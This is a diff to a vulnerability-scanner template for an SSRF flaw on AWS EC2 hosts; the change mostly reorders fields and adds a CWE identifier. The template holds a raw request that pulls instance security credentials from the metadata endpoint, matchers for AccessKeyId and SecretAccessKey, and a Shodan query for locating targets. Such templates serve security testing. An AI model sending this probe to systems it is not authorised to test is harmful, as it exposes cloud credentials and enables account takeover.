@@ -7,15 +7,26 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
     cvss-score: 9.3
-    cwe-id: CWE-441
+    cwe-id: CWE-441,CWE-918
   metadata:
     runzero-match: service["http.head.server"] matches "EC2ws"
     max-request: 2
-    shodan-query: "Server: EC2ws"
+    shodan-query: 'Server: EC2ws'
     verified: true
   tags: amazon,aws,ec2,ssrf,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - AccessKeyId
+          - SecretAccessKey
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |+
         GET {{BaseURL}}/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
         Host: {{Hostname}}
@@ -27,14 +38,3 @@ http:
 
     stop-at-first-match: true
     unsafe: true
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "AccessKeyId"
-          - "SecretAccessKey"
-        condition: and
-      - type: status
-        status:
-          - 200
